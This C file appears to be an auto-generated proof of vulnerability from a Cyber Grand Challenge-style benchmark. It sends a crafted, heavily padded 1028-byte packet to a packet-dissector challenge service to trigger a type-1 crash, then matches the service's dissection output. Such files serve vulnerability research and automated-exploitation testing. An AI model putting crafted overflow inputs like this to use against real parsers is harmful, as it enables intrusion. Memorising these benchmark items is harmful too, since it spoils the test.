#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x0b\x70\x39\x25"
         "\x82\xf1\x8f\xf0\x19\x7a\x88\x85\x99\x01\x00\x00\xe2\x11\x99\x42"
         "\xb0\x2b\x19\xc5\x76\xc9\x63\x44\x73\x0a\xa6\x65\x6a\xba\x75\xb1"
         "\xb7\x82\xce\xfd\xb0\x44\xea\xb7\x90\x23\x55\x89\xa1\x76\xc9\xe5"
         "\xcb\xbc\xfc\xd9\x04\x3d\xaa\x4e\xf9\x5d\x43\x04\xcb\xc6\x1b\xe4"
         "\xd8\x03\x6c\xed\x4b\xec\xd8\x1b\x90\xa3\xe7\x89\xba\xdf\x47\xf2"
         "\x15\x27\x1d\x5e\x40\x76\xdd\xbe\x2a\x33\x2d\x15\xb7\xe5\x5a\x08"
         "\x97\xe7\xe6\x3f\x71\x36\x9e\x01\x63\x10\xba\x84\x36\x74\xf4\x01"
         "\xe1\x53\x6d\x86\xb1\xf5\x82\xeb\xd4\xf6\x70\xb5\xc6\x6b\x57\xeb"
         "\x41\xfd\xd8\xbb\x54\x61\xd2\x59\x91\x4b\xf2\x49\x23\xcb\xb4\x13"
         "\xfc\x42\xdd\x01\x01\x59\x6c\x2f\xb0\x0f\x4d\x18\xb2\xda\x14\xac"
         "\x53\x98\x6a\xf3\xda\xbb\x30\x90\xe2\xce\x4a\x3d\x2c\x7f\x05\x79"
         "\xb0\x94\xcc\xb1\x53\x46\x86\x8a\x02\x9c\x1d\x4f\xe1\x3d\xf6\x2d"
         "\x65\xb3\x12\x5f\x0f\xdc\xbb\xa9\x8b\xe8\x6f\xb9\x65\x69\xc3\x7d"
         "\x2c\x5b\x0c\x46\xe5\x0c\x3a\x17\x07\x08\xc1\xd0\x68\x50\x50\x29"
         "\x72\x7f\xf6\x4f\x02\x82\x05\xe2\xdb\xbf\x03\xfa\x97\xc2\x10\x5e"
         "\x92\x75\x8d\xa0\x74\xc6\x1b\x77\x62\xf3\x4b\x97\xa8\x31\x00\x6c"
         "\xc8\xfc\xfc\xf5\x5a\xc6\x84\xd9\xfd\x53\x9c\x40\x9c\xc1\x7c\x50"
         "\x4c\x3d\xee\xc9\xef\x86\x7d\xd8\xc4\xeb\xeb\x6a\x80\x14\xba\x80"
         "\xef\x8e\x2c\xb2\xf8\x94\xd2\xd0\x72\x61\x0f\xb3\x81\xdf\xa2\xbf"
         "\xe3\x1c\x74\x1e\xb3\x8f\x50\xef\x38\x9b\xfc\xd8\xbd\x97\xbc\x44"
         "\xbb\x13\xa6\xd5\xdf\x3e\xb9\x81\xfe\x4e\xce\x22\xf5\xd6\xba\xf6"
         "\x32\x90\x87\x74\x00\x27\x69\xf4\x78\xd3\x4e\x02\x9e\x7d\x7e\xfa"
         "\xec\x68\x3d\x74\x4a\xf9\xe0\x60\xe4\xe0\x43\xfc\xc3\xb7\x19\xd4"
         "\x77\x8f\xdc\xe8\xe5\x21\xee\x78\x36\x6f\x4d\xc6\xb6\x14\xce\x93"
         "\x68\x4c\x53\x9e\xbc\x10\x47\x65\x63\x5f\x1e\xad\x80\xd5\x27\xbe"
         "\x62\x8d\xee\xad\xf5\xe8\x32\x54\xe6\x97\x81\x37\x14\xdc\x35\x3d"
         "\x29\x7c\x2f\x0f\xae\x8b\x3f\xe6\xe2\x74\x8f\xa7\x5a\x80\x28\x99"
         "\x00\xa7\x2f\xef\x8f\xbf\x3c\x7d\xe5\x24\x6a\x51\x4a\x04\xc0\x7e"
         "\xae\xf6\x46\x64\x0d\x5b\x59\x52\x7f\x50\x6b\x12\x86\x9e\xb3\xd5"
         "\x22\x99\x3f\xb4\x30\x5c\xf8\xa7\x25\xd0\xd9\xff\xeb\x18\x04\x17"
         "\x89\x8b\xed\x42\x2a\xf6\x42\xa6\xdd\xfa\x9d\x89\xa0\x9c\xdb\xf3"
         "\x2e\x42\xdb\xd5\x6d\x63\x56\x9b\xd7\x41\x65\x67\xde\xe0\x8a\xd4"
         "\x77\xa8\x24\xda\xc4\x48\x08\x82\xed\xf4\x2d\x57\x79\x42\xe9\xae"
         "\xfc\x09\x94\xd7\xce\x8f\x16\xbe\xcd\x9f\xdd\xcb\x67\xd9\x26\x0d"
         "\x92\x27\x61\x9c\x12\x77\xde\x1e\xbf\x89\x34\x43\xb4\x2d\x9f\x47"
         "\x27\x2a\x70\x6a\x80\x91\x89\x34\xa3\x74\x8f\xb0\xe6\xc6\x34\x20"
         "\x5d\x6f\xc2\x0a\x6c\x12\x28\xcd\xd1\xf3\x37\xd4\x4f\xc9\xa6\xea"
         "\xa6\x73\x24\x97\x75\x11\x7f\x25\x66\x05\xa0\xf3\xd6\x7b\xff\x9f"
         "\xad\xa2\x71\x8c\x78\xd8\x65\x7d\x0b\xbe\x01\xab\xb1\x30\x14\xb0"
         "\x07\xe4\xd9\x02\x5a\x7a\xed\xae\xd5\x8c\x49\x35\x6b\x22\x21\x06"
         "\x7e\x1d\xfc\x94\x26\x7d\xeb\xb6\xcf\x9e\x25\x25\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===overedgeevangelican
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6f\x76\x65\x72\x65\x64\x67\x65\x65\x76\x61"
         "\x6e\x67\x65\x6c\x69\x63\x61\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
